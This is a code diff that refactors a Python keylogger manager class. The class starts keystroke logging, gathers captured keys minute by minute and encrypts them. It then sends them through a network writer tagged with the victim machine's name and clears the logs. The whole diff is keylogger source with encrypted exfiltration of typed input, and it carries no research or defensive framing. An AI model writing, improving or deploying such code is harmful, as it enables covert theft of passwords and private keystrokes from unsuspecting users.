@@ -1,5 +1,4 @@
 from datetime import datetime
-import socket
 import time
 from key_logger_service import KeyLoggerService
 from encryptor import Encryptor
@@ -12,21 +11,28 @@ class KeyLoggerManager:
         self.encryptor = Encryptor()
         self.network_writer = NetworkWriter()
         self.buffer = {}
-        self.last_sent_minute = None
 
     def run_logger_loop(self):
-        self.key_logger.start_logging()
+        try:
+            self.key_logger.start_logging()
+        except Exception as e:
+            print(f"Error starting key logger: {e}")
+            return
 
         try:
             while True:
                 current_time = datetime.now().strftime("%Y-%m-%d %H_%M")
+                self.buffer = self.key_logger.get_logged_keys()
 
-                if self.last_sent_minute is None or current_time != self.last_sent_minute:
-                    self.buffer = self.get_recently_logged_keys()
-                    if self.buffer:
-                        self.last_sent_minute = current_time
-                        self.send_logged_keys(self.buffer)
-                time.sleep(1)
+                if self.buffer:
+                    log_time = list(self.buffer.keys())[0]
+
+                    if log_time != current_time:
+                        encrypted_data = self.encrypt_logged_keys(self.buffer)
+                        self.send_logged_keys(log_time, encrypted_data)
+                        self.key_logger.reset_logs()
+
+                time.sleep(2)
 
         except KeyboardInterrupt:
             self.key_logger.stop_logging()
@@ -37,9 +43,8 @@ class KeyLoggerManager:
     def encrypt_logged_keys(self, logs):
         return self.encryptor.encrypt(logs)
 
-    def send_logged_keys(self, encrypted_data):
-        machine_name = socket.gethostname()
-        payload = {self.last_sent_minute: encrypted_data}
-        print(f" Sending data: {payload} to {machine_name}")
+    def send_logged_keys(self,log_time, encrypted_data):
+        payload = {log_time: encrypted_data}
+        print(f"Sending data: {payload} to {self.key_logger.get_machine_name()}")
 
-        self.network_writer.send_data(payload, machine_name)
+        self.network_writer.send_data(payload, self.key_logger.get_machine_name())
